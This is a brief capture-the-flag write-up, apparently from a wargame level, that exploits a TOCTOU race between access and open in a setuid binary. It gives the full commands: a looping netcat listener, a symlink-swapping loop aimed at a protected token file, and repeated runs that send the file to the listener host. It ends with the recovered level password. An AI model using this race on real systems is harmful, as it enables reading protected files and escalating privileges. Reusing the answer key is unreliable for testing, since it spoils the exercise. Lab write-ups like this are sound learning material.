after reversing the binary level10 using dogbolt, we've noticed that there is a TOCTOU Race condition
between access and open, knowing that level10 cannot access to token

level10 takes to arguments the HOST and a file

we made a server using nc

while true; do nc -lp 6969; done

and running:

while true; do
	ln -sf /home/user/level10/token /tmp/file
	ln -sf /tmp/link /tmp/file
done


then sending multiple requests to the server

while true; do ./level10 /tmp/file 10.12.10.1; usleep 500; done

After several attempts we get the password: woupa2yuojeeaaed06riuj63c
